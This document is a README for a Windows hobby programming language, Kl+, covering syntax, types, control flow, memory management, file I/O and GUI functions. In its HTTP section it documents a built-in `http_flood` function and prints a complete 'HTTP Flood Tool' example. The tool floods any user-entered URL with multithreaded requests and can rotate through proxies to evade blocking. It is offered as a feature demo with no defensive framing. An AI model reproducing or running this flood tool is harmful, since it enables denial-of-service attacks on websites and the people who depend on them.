# Kl+ Programming Language

**Kl+** is a modern compiled programming language that combines low-level control of C/C++ with the expressiveness of high-level languages.

- **Version:** 1.3.2
- **Platforms:** Windows

---

## Installation

Check installation:
```bash
kl version
```
> If `kl` is not found, add `C:\kl+\bin` to your `PATH` environment variable.

---

## Quick Start

Create a file `hello.kl`:
```
fn main() {
    println("Hello, World!");
}
```
Run the program:
```bash
kl run hello.kl
```

---

## 1. Variables

### Immutable (default)
```
let x: i32 = 10;
```

### Mutable
```
let mut y: i32 = 20;
y = 30;
y += 10;
```

### Short declaration (type inference)
```
z := 42;
name := "Alice";
```

### C-style declaration
```
int a = 100;
float b = 3.14;
string s = "Hello";
```

### Constants
```
const PI: f64 = 3.14159265359;
const MAX_SIZE: i32 = 1000;
```

### `var` — short mutable
```
var count = 0;
count += 1;
```

---

## 2. Data Types

### Integers
| Type      | Size    | Range                      |
|----------|---------|----------------------------|
| `i8`     | 1 byte  | -128 to 127                |
| `i16`    | 2 bytes | -32768 to 32767            |
| `i32`/`int` | 4 bytes | ±2 billion                 |
| `i64`    | 8 bytes | ±9 quintillion             |
| `u8`     | 1 byte  | 0 to 255                   |
| `u16`    | 2 bytes | 0 to 65535                 |
| `u32`    | 4 bytes | 0 to 4 billion             |
| `u64`    | 8 bytes | 0 to 18 quintillion        |

### Floating point numbers
| Type        | Size    | Precision     |
|------------|---------|---------------|
| `f32`      | 4 bytes | ~7 digits     |
| `f64`/`float` | 8 bytes | ~15 digits    |

### Other types
| Type        | Description               |
|------------|---------------------------|
| `bool`     | `true` or `false`         |
| `char`     | Single character `'A'`    |
| `str`/`string` | String `"Hello"`         |

### Number literals
```
let decimal: i32 = 42;
let hex: i32 = 0xFF;
let binary: i32 = 0b1010;
let octal: i32 = 0o77;
let with_sep: i64 = 1_000_000;
let scientific: f64 = 3.14e-2;
```

---

## 3. Functions

### Basic function
```
fn add(a: i32, b: i32) -> i32 {
    return a + b;
}

fn main() {
    let result: i32 = add(5, 3);
    println("5 + 3 = %d", result);
}
```

### No return value
```
fn greet(name: str) {
    println("Hello, %s!", name);
}
```

### Short form
```
fn square(x: i32) -> i32 => x * x;
fn double(x: i32) -> i32 => x * 2;
```

### Default values
```
fn power(base: f64, exp: i32 = 2) -> f64 {
    let mut result: f64 = 1.0;
    for i in 0..exp {
        result = result * base;
    }
    return result;
}

fn main() {
    println("%f", power(3.0));      // 9.0
    println("%f", power(2.0, 10));  // 1024.0
}
```

### Public function
```
pub fn api_function() {
    // Accessible from other modules
}
```

---

## 4. Operators

### Arithmetic
| Operator | Description | Example        |
|----------|------------|---------------|
| `+`      | Addition   | `5 + 3 → 8`   |
| `-`      | Subtraction| `5 - 3 → 2`   |
| `*`      | Multiplication | `5 * 3 → 15` |
| `/`      | Division   | `7 / 2 → 3`   |
| `%`      | Remainder  | `7 % 3 → 1`   |
| `**`     | Power      | `2 ** 10 → 1024` |

```
fn main() {
    println("10 + 3 = %d", 10 + 3);
    println("10 - 3 = %d", 10 - 3);
    println("10 * 3 = %d", 10 * 3);
    println("10 / 3 = %d", 10 / 3);
}
```

### Comparisons
| Operator | Description    |
|----------|---------------|
| `==`     | Equal         |
| `!=`     | Not equal     |
| `<`      | Less than     |
| `>`      | Greater than  |
| `<=`     | Less or equal |
| `>=`     | Greater or equal |

```
fn main() {
    let a: i32 = 10;
    let b: i32 = 20;
    if a < b {
        println("a is less than b");
    }
}
```

### Logical
| Operator | Description |
|----------|------------|
| `&&`     | AND        |
| `\|\|`   | OR         |
| `!`      | NOT        |

```
fn main() {
    let age: i32 = 25;
    let has_license: bool = true;
    if age >= 18 && has_license {
        println("OK");
    }
}
```

### Bitwise
| Operator | Description  |
|----------|-------------|
| `&`      | AND         |
| `\|`     | OR          |
| `^`      | XOR         |
| `~`      | NOT         |
| `<<`     | Left shift  |
| `>>`     | Right shift |

```
fn main() {
    let a: i32 = 0b1010;
    let b: i32 = 0b1100;
    println("a & b = %d", a & b);   // 8 (0b1000)
    println("a << 2 = %d", a << 2); // 40 (0b101000)
}
```

### Assignment
```
fn main() {
    let mut x: i32 = 10;
    x = 20;
    x += 5;   // 25
    x -= 3;   // 22
    x *= 2;   // 44
    x /= 4;   // 11
    x %= 3;   // 2
    println("x = %d", x);
}
```

### Increment and Decrement
```
fn main() {
    let mut i: i32 = 0;
    i++;      // postfix
    ++i;      // prefix
    i--;
    --i;
    println("i = %d", i);
}
```

### Ternary operator
```
fn main() {
    let age: i32 = 20;
    let status: str = age >= 18 ? "adult" : "minor";
    println("Status: %s", status);
}
```

---

## 5. Control Flow

### If / Elif / Else
```
fn main() {
    let score: i32 = 85;
    if score >= 90 {
        println("Excellent!");
    } elif score >= 70 {
        println("Good");
    } elif score >= 50 {
        println("OK");
    } else {
        println("Fail");
    }
}
```

### For (range)
```
fn main() {
    // 0..10 (excluding 10)
    for i in 0..10 {
        println("%d", i);
    }
    
    // 1..=10 (inclusive)
    for i in 1..=10 {
        println("%d", i);
    }
}
```

### For with step
```
fn main() {
    for i in 0..10 step 2 {
        println("%d", i);  // 0, 2, 4, 6, 8
    }
}
```

### For with filter
```
fn main() {
    for i in 0..20 where i % 2 == 0 {
        println("%d", i);  // even numbers
    }
}
```

### For (C-style)
```
fn main() {
    for (int i = 0; i < 10; i++) {
        println("%d", i);
    }
}
```

### For-else
```
fn main() {
    for i in 0..10 {
        if i == 5 {
            println("Found 5!");
            break;
        }
    } else {
        println("Not found");  // executes if break didn't occur
    }
}
```

### While
```
fn main() {
    let mut count: i32 = 0;
    while count < 5 {
        println("Count: %d", count);
        count += 1;
    }
}
```

### Do-While
```
fn main() {
    let mut i: i32 = 0;
    do {
        println("i = %d", i);
        i += 1;
    } while i < 3;
}
```

### Loop (infinite)
```
fn main() {
    let mut counter: i32 = 0;
    loop {
        println("Counter: %d", counter);
        counter += 1;
        if counter >= 5 {
            break;
        }
    }
}
```

### Break and Continue
```
fn main() {
    for i in 0..10 {
        if i == 3 { continue; }
        if i == 7 { break; }
        println("%d", i);  // 0,1,2,4,5,6
    }
}
```

### Match
```
fn main() {
    let day: i32 = 3;
    match day {
        1 => println("Monday"),
        2 => println("Tuesday"),
        3 => println("Wednesday"),
        4 => println("Thursday"),
        5 => println("Friday"),
        _ => println("Weekend")
    }
}
```

---

## 6. Structures

### Declaration and usage
```
struct Point {
    x: i32,
    y: i32
}

fn main() {
    let mut p: Point;
    p.x = 10;
    p.y = 20;
    println("Point: (%d, %d)", p.x, p.y);
}
```

### Methods (impl)
```
struct Rectangle {
    width: i32,
    height: i32
}

impl Rectangle {
    pub fn area(self) -> i32 {
        return self.width * self.height;
    }
    
    pub fn scale(&mut self, factor: i32) {
        self.width *= factor;
        self.height *= factor;
    }
}

fn main() {
    let mut rect: Rectangle;
    rect.width = 10;
    rect.height = 5;
    println("Area: %d", rect.area());
    
    rect.scale(2);
    println("New area: %d", rect.area());
}
```

---

## 7. Enum

```
enum Color {
    Red,
    Green,
    Blue
}

enum Status {
    Ok = 200,
    NotFound = 404,
    Error = 500
}

fn main() {
    let status: Status = Status::Ok;
    match status {
        Status::Ok => println("Success"),
        Status::NotFound => println("Not found"),
        Status::Error => println("Error")
    }
}
```

---

## 8. Memory Management

### Allocation and freeing
```
fn main() {
    let arr: ptr<i32> = alloc(i32, 10);
    arr[0] = 100;
    arr[1] = 200;
    println("arr[0] = %d", arr[0]);
    println("arr[1] = %d", arr[1]);
    free arr;
}
```

### Pointers
```
fn main() {
    let mut x: i32 = 42;
    let ptr: ptr<i32> = &x;
    let value: i32 = *ptr;
    println("x = %d, *ptr = %d", x, value);
    
    *ptr = 100;
    println("x = %d", x);  // 100
}
```

### sizeof and cast
```
fn main() {
    println("sizeof(i32) = %d", sizeof(i32));
    
    let i: i32 = 65;
    let c: char = cast<char>(i);
    println("char: %c", c);  // 'A'
    
    let f: f64 = 3.14;
    let n: i32 = cast<i32>(f);
    println("int: %d", n);  // 3
}
```

### Unsafe block
```
fn main() {
    unsafe {
        let raw: ptr<u8> = alloc(u8, 256);
        raw[0] = 72;
        raw[1] = 0;
        free raw;
    }
}
```

---

## 9. Built-in Functions

### Input/Output
| Function          | Description            |
|------------------|------------------------|
| `print("text")`  | Print without newline  |
| `println("text")`| Print with newline     |
| `input()`        | Read string input      |
| `input_int()`    | Read integer input     |
| `input_float()`  | Read float input       |

```
fn main() {
    print("Enter name: ");
    let name: str = input();
    print("Enter age: ");
    let age: i32 = input_int();
    println("Hello, %s! Age: %d", name, age);
}
```

### Mathematics
| Function               | Description                 |
|-----------------------|-----------------------------|
| `sqrt(x)`             | Square root                 |
| `pow(base, exp)`      | Power                       |
| `abs(x)`              | Absolute (integers)         |
| `fabs(x)`             | Absolute (float)            |
| `floor(x)`, `ceil(x)` | Round down/up               |
| `round(x)`            | Mathematical rounding       |
| `sin(x)`, `cos(x)`, `tan(x)` | Trigonometry          |
| `log(x)`, `log10(x)`  | Logarithms                  |
| `exp(x)`              | Exponential                 |
| `min(a,b)`, `max(a,b)`| Min/max (integers)          |
| `fmin(a,b)`, `fmax(a,b)` | Min/max (float)          |
| `clamp(x, lo, hi)`    | Clamp value to range        |

```
fn main() {
    println("sqrt(16) = %f", sqrt(16.0));
    println("pow(2, 10) = %f", pow(2.0, 10.0));
    println("abs(-42) = %d", abs(-42));
    println("clamp(15, 0, 10) = %d", clamp(15, 0, 10));  // 10
}
```

### Random numbers
| Function               | Description                 |
|-----------------------|-----------------------------|
| `rand()`              | Random number (0..RAND_MAX) |
| `rand_range(min, max)`| Number in range             |
| `srand(seed)`         | Set random seed             |

```
fn main() {
    srand(42);
    println("rand() = %d", rand());
    println("rand_range(1, 100) = %d", rand_range(1, 100));
}
```

### Strings
| Function        | Description                     |
|----------------|---------------------------------|
| `strlen(s)`    | String length                   |
| `strcmp(a, b)` | Compare (0 = equal)             |

```
fn main() {
    let s: str = "Hello";
    println("Length: %d", strlen(s));
    
    if strcmp("abc", "abc") == 0 {
        println("Equal!");
    }
}
```

### Utilities
| Function             | Description                 |
|---------------------|-----------------------------|
| `exit(code)`        | Exit program                |
| `assert(cond, msg)` | Check condition             |
| `sizeof(type)`      | Size of type in bytes       |

---

## 10. Output Formatting

| Specifier | Type       | Example                  |
|-----------|-----------|-------------------------|
| `%d`      | `i32`     | `println("%d", 42)`     |
| `%lld`    | `i64`     | `println("%lld", 123456789)` |
| `%f`      | `f64`     | `println("%f", 3.14)`   |
| `%s`      | `str`     | `println("%s", "hello")`|
| `%c`      | `char`    | `println("%c", 65)`     |
| `%%`      | % symbol  | `println("100%%")`      |

---

## 11. CLI Commands

```bash
kl build main.kl --console output.exe    # Compile console application
kl build main.kl --app output.exe        # Compile GUI application
kl run main.kl                           # Build and run
kl check main.kl                         # Syntax check
kl tokens main.kl                        # Show tokens
kl version                               # Compiler version
kl help                                  # Help
```

---

## 12. HTTP/HTTPS Functions

### GET Requests

| Function | Description | Returns |
|---------|-------------|---------|
| `http_get(url)` | HTTP GET request | `str` — response body |
| `https_get(url)` | HTTPS GET request | `str` — response body |
| `http_get_status(url)` | HTTP status code | `i32` — code (200, 404...) |
| `https_get_status(url)` | HTTPS status code | `i32` — code (200, 404...) |

---

### POST Requests

| Function | Description | Returns |
|---------|-------------|---------|
| `http_post(url, data)` | HTTP POST request | `str` — response body |
| `https_post(url, data)` | HTTPS POST request | `str` — response body |

---

### Proxy

| Function | Description | Returns |
|---------|-------------|---------|
| `https_get_proxy(url, proxy)` | HTTPS GET via proxy | `str` — response body |
| `https_post_proxy(url, data, proxy)` | HTTPS POST via proxy | `str` — response body |
| `https_get_status_proxy(url, proxy)` | HTTPS status via proxy | `i32` — code |

**Proxy format:**
- `"http://ip:port"`
- `"ip:port"`

---

### File Download

| Function | Description | Returns |
|---------|-------------|---------|
| `http_download(url, filename)` | Download file | `i32` — 0 = OK, -1 = error |

---

### Multi-threaded Requests

| Function | Description | Returns |
|---------|-------------|---------|
| `http_flood(url, count, threads)` | Parallel GET requests | `i32` — number of successful |

---

### Memory Management

| Function | Description |
|---------|-------------|
| `http_free(response)` | Free response memory |

---

### HTTP Flood Example

```
fn main() {
    println("================================");
    println("   Kl+ HTTP Flood Tool v2.0");
    println("================================");
    println("");
    
    // URL input
    print("Enter target URL: ");
    let url: str = input();
    
    // Request count input
    print("How many requests? ");
    let count: i32 = input_int();
    
    // Thread count input
    print("Threads (1-64): ");
    let threads: i32 = input_int();
    
    // Mode selection
    println("");
    println("Mode:");
    println("  1 - No proxy (direct)");
    println("  2 - With proxies");
    print("Choose (1-2): ");
    let mode: i32 = input_int();
    
    println("");
    
    if mode == 1 {
        // No proxy - multi-threaded flood
        println("Starting %d requests with %d threads...", count, threads);
        println("");
        
        let success: i32 = http_flood(url, count, threads);
        
        println("");
        println("================================");
        println("  Results:");
        println("  Total:   %d", count);
        println("  Success: %d", success);
        println("  Failed:  %d", count - success);
        println("================================");
    } elif mode == 2 {
        // With proxies - manual input
        println("Enter proxies (format: ip:port)");
        println("Enter empty line to stop");
        println("");
        
        // Store up to 20 proxies
        let mut p1: str = "";
        let mut p2: str = "";
        let mut p3: str = "";
        let mut p4: str = "";
        let mut p5: str = "";
        let mut proxy_count: i32 = 0;
        
        print("Proxy 1: ");
        p1 = input();
        if strlen(p1) > 3 { proxy_count = 1; }
        
        if proxy_count >= 1 {
            print("Proxy 2 (or empty): ");
            p2 = input();
            if strlen(p2) > 3 { proxy_count = 2; }
        }
        
        if proxy_count >= 2 {
            print("Proxy 3 (or empty): ");
            p3 = input();
            if strlen(p3) > 3 { proxy_count = 3; }
        }
        
        if proxy_count >= 3 {
            print("Proxy 4 (or empty): ");
            p4 = input();
            if strlen(p4) > 3 { proxy_count = 4; }
        }
        
        if proxy_count >= 4 {
            print("Proxy 5 (or empty): ");
            p5 = input();
            if strlen(p5) > 3 { proxy_count = 5; }
        }
        
        println("");
        println("Using %d proxies", proxy_count);
        println("Starting %d requests with %d threads...", count, threads);
        println("");
        
        // Send requests with proxy rotation
        let mut success: i32 = 0;
        let mut fail: i32 = 0;
        
        for i in 1..=count {
            let mut current_proxy: str = p1;
            let proxy_idx: i32 = (i - 1) % proxy_count;
            
            if proxy_idx == 0 { current_proxy = p1; }
            elif proxy_idx == 1 { current_proxy = p2; }
            elif proxy_idx == 2 { current_proxy = p3; }
            elif proxy_idx == 3 { current_proxy = p4; }
            elif proxy_idx == 4 { current_proxy = p5; }
            
            let status: i32 = https_get_status_proxy(url, current_proxy);
            
            if status >= 200 && status < 400 {
                success += 1;
                println("  [%d/%d] Proxy: %s -> %d OK", i, count, current_proxy, status);
            } else {
                fail += 1;
                println("  [%d/%d] Proxy: %s -> %d FAIL", i, count, current_proxy, status);
            }
        }
        
        println("");
        println("================================");
        println("  Results:");
        println("  Total:   %d", count);
        println("  Success: %d", success);
        println("  Failed:  %d", fail);
        println("  Proxies: %d", proxy_count);
        println("================================");
    } else {
        println("Invalid mode!");
    }
}
```

---

## 13. Program Examples

### Fibonacci Numbers
```
fn fib(n: i32) -> i64 {
    if n <= 1 { return n; }
    
    let mut a: i64 = 0;
    let mut b: i64 = 1;
    
    for i in 2..=n {
        let temp: i64 = a + b;
        a = b;
        b = temp;
    }
    return b;
}

fn main() {
    for i in 0..20 {
        println("fib(%d) = %lld", i, fib(i));
    }
}
```

### Prime Numbers
```
fn is_prime(n: i32) -> bool {
    if n <= 1 { return false; }
    if n <= 3 { return true; }
    if n % 2 == 0 { return false; }
    
    let mut i: i32 = 3;
    while i * i <= n {
        if n % i == 0 { return false; }
        i += 2;
    }
    return true;
}

fn main() {
    for n in 2..=100 {
        if is_prime(n) {
            print("%d ", n);
        }
    }
    println("");
}
```

### Guess the Number
```
fn main() {
    srand(42);
    let secret: i32 = rand_range(1, 100);
    let mut attempts: i32 = 0;

    println("=== Guess the Number ===");
    println("Number between 1 and 100");

    loop {
        print("Your guess: ");
        let guess: i32 = input_int();
        attempts += 1;

        if guess < secret {
            println("Too low!");
        } elif guess > secret {
            println("Too high!");
        } else {
            println("Correct! %d attempts!", attempts);
            break;
        }
    }
}
```

### Calculator
```
fn main() {
    println("=== Calculator ===");

    print("First number: ");
    let a: f64 = input_float();

    print("Operator (+, -, *, /): ");
    let op: str = input();

    print("Second number: ");
    let b: f64 = input_float();

    if strcmp(op, "+") == 0 {
        println("Result: %f", a + b);
    } elif strcmp(op, "-") == 0 {
        println("Result: %f", a - b);
    } elif strcmp(op, "*") == 0 {
        println("Result: %f", a * b);
    } elif strcmp(op, "/") == 0 {
        if b != 0.0 {
            println("Result: %f", a / b);
        } else {
            println("Division by zero!");
        }
    } else {
        println("Unknown operator!");
    }
}
```

### Console Game Template
```
struct Player {
    x: i32,
    y: i32,
    health: i32,
    score: i32
}

fn main() {
    srand(12345);

    let mut player: Player;
    player.x = 5;
    player.y = 5;
    player.health = 100;
    player.score = 0;

    let mut running: bool = true;

    println("=== My Game ===");
    println("Commands: w/a/s/d = move, q = quit");

    while running && player.health > 0 {
        println("");
        println("Position: (%d, %d)", player.x, player.y);
        println("Health: %d  Score: %d", player.health, player.score);

        print("> ");
        let cmd: str = input();

        if strcmp(cmd, "w") == 0 {
            player.y -= 1;
        } elif strcmp(cmd, "s") == 0 {
            player.y += 1;
        } elif strcmp(cmd, "a") == 0 {
            player.x -= 1;
        } elif strcmp(cmd, "d") == 0 {
            player.x += 1;
        } elif strcmp(cmd, "q") == 0 {
            running = false;
        } else {
            println("Unknown command!");
        }

        player.score += 10;
    }

    println("");
    println("Game Over! Score: %d", player.score);
}
```

## 14. Imports

### File inclusion
```
import "myfile.kl";
```
Includes the contents of another `.kl` file. Searches in the current folder first, then in `stdlib/`.

---

## 15. Error Handling

### Try / Catch / Throw
```
try {
    throw "Something went wrong!";
} catch (err) {
    println("Error: %s", err);
}
```

| Keyword | Description |
|---------|-------------|
| `try` | Code block that may throw an error |
| `catch (err)` | Catches the error, `err` is the message string |
| `throw "msg"` | Throws an error |

---

## 16. Timers

| Function | Description | Returns |
|----------|-------------|---------|
| `timer_start()` | Start timer | — |
| `timer_end()` | Stop and get time | `f64` — milliseconds |
| `timer_ms()` | Current time in milliseconds | `f64` |
| `timer_us()` | Current time in microseconds | `f64` |
| `sleep(seconds)` | Pause in seconds | — |
| `sleep_ms(ms)` | Pause in milliseconds | — |

```
timer_start();
// ... code ...
let elapsed: f64 = timer_end();
println("Time: %f ms", elapsed);

sleep(1);
sleep_ms(500);
```

---

## 17. File I/O

| Function | Description | Returns |
|----------|-------------|---------|
| `file_read(path)` | Read file | `str` — content |
| `file_write(path, content)` | Write to file | `i32` — 0 = OK |
| `file_append(path, content)` | Append to file | `i32` — 0 = OK |
| `file_exists(path)` | Check if exists | `i32` — 1 = yes |
| `file_delete(path)` | Delete file | `i32` — 0 = OK |
| `file_copy(src, dst)` | Copy file | `i32` — 0 = OK |
| `file_size(path)` | File size | `i64` — bytes |
| `file_lines(path)` | Number of lines | `i32` |
| `file_read_bytes(path, offset, count)` | Read bytes | `str` |
| `file_write_bytes(path, data, length)` | Write bytes | `i32` — 0 = OK |

```
file_write("test.txt", "Hello World!\n");
let content: str = file_read("test.txt");
println("%s", content);

if file_exists("test.txt") == 1 {
    let size: i64 = file_size("test.txt");
    println("Size: %lld bytes", size);
}

file_append("test.txt", "New line\n");
file_copy("test.txt", "backup.txt");
file_delete("backup.txt");
```

---

## 18. Graphical User Interface (GUI)

### MessageBox

| Function | Description | Returns |
|----------|-------------|---------|
| `msgbox(title, message)` | Information box | `i32` |
| `msgbox_yesno(title, message)` | Yes/No box | `i32` — 1 = Yes, 0 = No |
| `msgbox_yesnocancel(title, message)` | Yes/No/Cancel box | `i32` — 1/0/-1 |
| `msgbox_error(title, message)` | Error box | — |
| `msgbox_warning(title, message)` | Warning box | — |
| `notification(title, message)` | System notification | — |

```
msgbox("Info", "Hello from Kl+!");

let answer: i32 = msgbox_yesno("Question", "Continue?");
if answer == 1 {
    println("Yes!");
}

msgbox_error("Error", "Something failed!");
```

### Input Dialog

| Function | Description | Returns |
|----------|-------------|---------|
| `input_dialog(title, prompt)` | Text input dialog | `str` |

```
let name: str = input_dialog("Input", "Enter your name:");
println("Hello, %s!", name);
```

### File Dialogs

| Function | Description | Returns |
|----------|-------------|---------|
| `file_open_dialog(title, filter)` | File open dialog | `str` — path |
| `file_save_dialog(title, filter)` | File save dialog | `str` — path |

```
let path: str = file_open_dialog("Open", "Text Files\0*.txt\0");
println("Selected: %s", path);
```

### Color Picker

| Function | Description | Returns |
|----------|-------------|---------|
| `color_dialog()` | Color picker | `i32` — RGB value, -1 = cancel |

```
let color: i32 = color_dialog();
println("Color: %d", color);
```

### Clipboard

| Function | Description | Returns |
|----------|-------------|---------|
| `clipboard_set(text)` | Copy to clipboard | `i32` — 0 = OK |
| `clipboard_get()` | Get from clipboard | `str` |

```
clipboard_set("Hello from Kl+!");
let text: str = clipboard_get();
println("Clipboard: %s", text);
```

### Window System

| Function | Description | Returns |
|----------|-------------|---------|
| `gui_window(title, width, height)` | Create window | `i32` — window ID |
| `gui_button(win, text, x, y, w, h, id)` | Add button | — |
| `gui_label(win, text, x, y, w, h, id)` | Add label | — |
| `gui_textbox(win, text, x, y, w, h, id)` | Add textbox | — |
| `gui_textbox_multi(win, text, x, y, w, h, id)` | Multi-line textbox | — |
| `gui_checkbox(win, text, x, y, w, h, id)` | Add checkbox | — |
| `gui_progressbar(win, x, y, w, h, id)` | Progress bar | — |
| `gui_set_progress(win, id, value)` | Set progress (0-100) | — |
| `gui_get_text(win, id)` | Get element text | `str` |
| `gui_set_text(win, id, text)` | Set element text | — |
| `gui_is_checked(win, id)` | Checkbox state | `i32` — 1 = checked |
| `gui_run(win)` | Run window loop | `i32` |
| `gui_close(win)` | Close window | — |
| `gui_show(win)` | Show window | — |
| `gui_hide(win)` | Hide window | — |
| `gui_set_title(win, title)` | Change title | — |
| `gui_enable(win, id, enabled)` | Enable/disable element | — |

```
let win: i32 = gui_window("My App", 400, 300);
gui_label(win, "Hello!", 20, 20, 200, 25, 1);
gui_textbox(win, "", 20, 50, 200, 25, 2);
gui_button(win, "Click Me", 20, 90, 100, 30, 3);
gui_checkbox(win, "Option", 20, 130, 150, 25, 4);
gui_progressbar(win, 20, 170, 350, 25, 5);
gui_set_progress(win, 5, 75);
gui_run(win);
```

## 19. GUI Events

| Function | Description | Returns |
|----------|-------------|---------|
| `gui_update(win)` | Update window (for event loop) | `i32` — 1 = running, 0 = closed |
| `gui_poll_event()` | Get next event | `i32` — 1 = event available, 0 = none |
| `gui_get_event_id()` | ID of the element that triggered the event | `i32` |
| `gui_get_event_type()` | Event type (1=click, 2=change) | `i32` |

```
let win: i32 = gui_window("My App", 400, 300);
gui_button(win, "Click Me", 20, 20, 100, 30, 10);

while gui_update(win) == 1 {
    while gui_poll_event() == 1 {
        let id: i32 = gui_get_event_id();
        if id == 10 {
            msgbox("Info", "Button clicked!");
        }
    }
    sleep_ms(16);
}
```

---

## 20. GUI Styles

| Function | Description |
|----------|-------------|
| `gui_set_color(win, id, r, g, b)` | Text color (RGB 0-255) |
| `gui_set_bg_color(win, id, r, g, b)` | Background color (RGB 0-255) |
| `gui_set_font(win, id, "name", size)` | Font and size |
| `gui_set_font_bold(win, id, 1)` | Bold font (1=yes, 0=no) |
| `gui_set_visible(win, id, 1)` | Visibility (1=show, 0=hide) |
| `gui_set_size(win, id, w, h)` | Change element size |
| `gui_set_pos(win, id, x, y)` | Change element position |

```
gui_set_color(win, 1, 255, 0, 0);
gui_set_bg_color(win, 1, 30, 30, 30);
gui_set_font(win, 1, "Arial", 20);
gui_set_font_bold(win, 1, 1);
gui_set_visible(win, 5, 0);
gui_set_size(win, 3, 300, 40);
gui_set_pos(win, 3, 50, 100);
```

---

## 21. GUI Dialogs

| Function | Description | Returns |
|----------|-------------|---------|
| `msgbox_yesnocancel(title, msg)` | Yes/No/Cancel dialog | `i32` — 1=Yes, 0=No, -1=Cancel |
| `file_open_dialog(title, filter)` | File open dialog | `str` — file path |
| `file_save_dialog(title, filter)` | File save dialog | `str` — file path |
| `color_dialog()` | Color picker | `i32` — RGB value |
| `clipboard_set(text)` | Copy to clipboard | `i32` — 0=OK |
| `clipboard_get()` | Get from clipboard | `str` |
| `notification(title, msg)` | System notification | — |

```
let path: str = file_open_dialog("Open", "Text\0*.txt\0");
let color: i32 = color_dialog();
clipboard_set("Hello!");
let text: str = clipboard_get();
```

---

## 22. Memory Management

| Function | Description | Returns |
|----------|-------------|---------|
| `mem_zero(ptr, size)` | Zero out memory block | — |
| `mem_fill(ptr, value, size)` | Fill with bytes | — |
| `mem_copy(dst, src, size)` | Copy memory block | — |
| `mem_compare(a, b, size)` | Compare blocks (0=equal) | `i32` |
| `mem_swap_int(&a, &b)` | Swap two ints | — |
| `mem_swap_float(&a, &b)` | Swap two floats | — |
| `mem_realloc(ptr, new_size)` | Resize allocated memory | `ptr` |
| `mem_info()` | Show memory information | — |
| `mem_active_count()` | Number of active allocations | `i32` |
| `mem_total_bytes()` | Total bytes allocated | `i32` |

```
let arr: ptr<i32> = alloc(i32, 10);
mem_zero(arr, 10 * 4);
mem_fill(arr, 0xFF, 10 * 4);

let copy: ptr<i32> = alloc(i32, 10);
mem_copy(copy, arr, 10 * 4);

let eq: i32 = mem_compare(arr, copy, 10 * 4);

let mut a: i32 = 10;
let mut b: i32 = 20;
mem_swap_int(&a, &b);

mem_info();
free arr;
free copy;
```

---

## 23. Array Utilities

| Function | Description | Returns |
|----------|-------------|---------|
| `array_fill_int(arr, count, value)` | Fill array with value | — |
| `array_fill_float(arr, count, value)` | Fill float array | — |
| `array_reverse_int(arr, count)` | Reverse array | — |
| `array_sum_int(arr, count)` | Sum of elements | `i32` |
| `array_min_int(arr, count)` | Minimum element | `i32` |
| `array_max_int(arr, count)` | Maximum element | `i32` |
| `array_find_int(arr, count, value)` | Find element (-1=not found) | `i32` |
| `array_sort_int(arr, count)` | Sort ascending | — |
| `array_print_int(arr, count)` | Print array | — |

```
let arr: ptr<i32> = alloc(i32, 5);
arr[0] = 42; arr[1] = 17; arr[2] = 93; arr[3] = 5; arr[4] = 71;

array_print_int(arr, 5);
array_sort_int(arr, 5);
array_print_int(arr, 5);

println("Sum: %d", array_sum_int(arr, 5));
println("Min: %d", array_min_int(arr, 5));
println("Max: %d", array_max_int(arr, 5));

let idx: i32 = array_find_int(arr, 5, 42);
println("Found 42 at index: %d", idx);

array_reverse_int(arr, 5);
array_fill_int(arr, 5, 0);

free arr;
```

---

**Download the latest version of the language in Releases (.exe)**
